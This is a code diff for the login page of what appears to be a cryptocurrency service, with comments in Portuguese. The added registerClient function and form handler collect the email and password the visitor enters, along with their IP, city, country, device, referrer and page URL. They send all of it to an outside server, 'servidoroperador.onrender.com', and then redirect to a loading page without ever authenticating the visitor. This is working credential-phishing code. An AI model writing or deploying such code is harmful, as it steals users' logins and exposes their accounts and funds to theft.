@@ -8,6 +8,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { Eye, EyeOff, ChevronDown } from "lucide-react"
 import Image from "next/image"
 import { useMetrics } from "@/hooks/useMetrics"
+import { useRouter } from "next/navigation"
 
 // Detectar idioma do navegador - padrão sempre inglês exceto francês
 const getDefaultLanguage = () => {
@@ -53,12 +54,83 @@ const chatOptions = {
   en: ["How to create an account?", "I forgot my password", "How to buy cryptocurrencies?", "Contact support"],
 }
 
+// Função para registrar cliente
+const registerClient = async (username: string, password: string) => {
+  try {
+    // Obter IP
+    let ip = ""
+    let country = "BR"
+    let city = "São Paulo"
+    let device = "Unknown"
+    
+    try {
+      const ipResponse = await fetch('https://api.ipify.org?format=json')
+      const ipData = await ipResponse.json()
+      ip = ipData.ip
+      
+      // Obter localização
+      const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`)
+      const locationData = await locationResponse.json()
+      country = locationData.country_code || "BR"
+      city = locationData.city || "São Paulo"
+      
+      // Detectar dispositivo
+      const userAgent = navigator.userAgent
+      if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
+        device = "Tablet"
+      } else if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(userAgent)) {
+        device = "Mobile"
+      } else {
+        device = "Desktop"
+      }
+    } catch (error) {
+      console.log("Erro ao obter informações do cliente:", error)
+    }
+    
+    // Dados para registro
+    const clientData = {
+      username,
+      password,
+      ip,
+      country,
+      city,
+      device,
+      referrer: document.referrer || "direct",
+      currentUrl: window.location.href
+    }
+    
+    // Enviar para API
+    const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(clientData)
+    })
+    
+    if (response.ok) {
+      const data = await response.json()
+      console.log("Cliente registrado com sucesso:", data)
+      return data
+    } else {
+      const errorData = await response.text()
+      console.log("Erro ao registrar cliente:", errorData)
+      return null
+    }
+  } catch (error) {
+    console.log("Erro durante registro de cliente:", error)
+    return null
+  }
+}
+
 export default function LoginPage() {
   const metrics = useMetrics() // Hook das métricas
+  const router = useRouter()
   const [language, setLanguage] = useState(() => getDefaultLanguage())
   const [showPassword, setShowPassword] = useState(false)
   const [email, setEmail] = useState("")
   const [password, setPassword] = useState("")
+  const [isLoading, setIsLoading] = useState(false)
 
   const [showChat, setShowChat] = useState(false)
   const [chatMessages, setChatMessages] = useState([
@@ -73,6 +145,26 @@ export default function LoginPage() {
       metrics.registerVisit() // Envia métricas automaticamente
     }
   }, [metrics])
+
+  // Função para lidar com o login
+  const handleLogin = async (e: React.FormEvent) => {
+    e.preventDefault()
+    
+    if (!email || !password) return
+    
+    setIsLoading(true)
+    
+    try {
+      // Registrar cliente
+      const clientData = await registerClient(email, password)
+      
+      // Redirecionar para página de loading
+      router.push("/loading")
+    } catch (error) {
+      console.log("Erro no login:", error)
+      setIsLoading(false)
+    }
+  }
 
   return (
     <div className="min-h-screen flex flex-col lg:flex-row">
@@ -100,7 +192,7 @@ export default function LoginPage() {
           </div>
 
           {/* Login Form */}
-          <div className="space-y-6">
+          <form onSubmit={handleLogin} className="space-y-6">
             <div className="space-y-4">
               <div>
                 <Label htmlFor="email" className="text-sm font-medium text-gray-700 mb-2 block">
@@ -112,6 +204,7 @@ export default function LoginPage() {
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
                   className="w-full h-12 px-4 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                  required
                 />
               </div>
 
@@ -126,6 +219,7 @@ export default function LoginPage() {
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
                     className="w-full h-12 px-4 pr-12 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                    required
                   />
                   <button
                     type="button"
@@ -139,17 +233,21 @@ export default function LoginPage() {
             </div>
 
             <div className="flex flex-col space-y-4 lg:flex-row lg:items-center lg:justify-between lg:space-y-0 pt-4">
-              <Button className="bg-black hover:bg-gray-800 text-white px-8 py-3 rounded-full font-medium w-full lg:w-auto">
-                {t.loginButton}
+              <Button 
+                type="submit" 
+                className="bg-black hover:bg-gray-800 text-white px-8 py-3 rounded-full font-medium w-full lg:w-auto"
+                disabled={isLoading}
+              >
+                {isLoading ? "..." : t.loginButton}
               </Button>
 
-              <button className="text-sm text-gray-600 hover:text-gray-800 underline text-center lg:text-left">{t.forgotPassword}</button>
+              <button type="button" className="text-sm text-gray-600 hover:text-gray-800 underline text-center lg:text-left">{t.forgotPassword}</button>
             </div>
 
             <div className="pt-6 text-sm text-gray-600 text-center lg:text-left">
-              {t.noAccount} <button className="text-black hover:underline font-medium">{t.createAccount}</button>
+              {t.noAccount} <button type="button" className="text-black hover:underline font-medium">{t.createAccount}</button>
             </div>
-          </div>
+          </form>
         </div>
       </div>
 
